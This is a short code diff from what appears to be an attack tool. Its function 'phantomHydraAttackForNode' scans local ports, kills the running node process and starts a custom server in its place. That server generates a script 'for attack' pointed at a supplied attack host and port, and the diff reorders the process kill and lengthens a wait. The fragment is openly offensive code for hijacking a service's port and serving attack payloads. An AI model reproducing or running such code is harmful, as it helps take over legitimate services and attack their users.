@@ -87,11 +87,11 @@ async def phantomHydraAttackForNginx(port_start, port_end, attack_host, attack_p
 async def phantomHydraAttackForNode(port_start, port_end, attack_host, attack_port):
     _scan_localhost_ports(port_start, port_end)
     port = int(input("Enter Open Port on which you want to continue: "))
-    killer = ProcessManagerNode(process_name="node")  # Change process name if needed
-    await killer.kill_process()
     custom_server = CustomServer(port=port)
     custom_server.generate_script_for_attack(host=attack_host, port=attack_port)
-    time.sleep(2)
+    killer = ProcessManagerNode(process_name="node") 
+    await killer.kill_process()
+    time.sleep(120)
     custom_server.start_server()
     
     
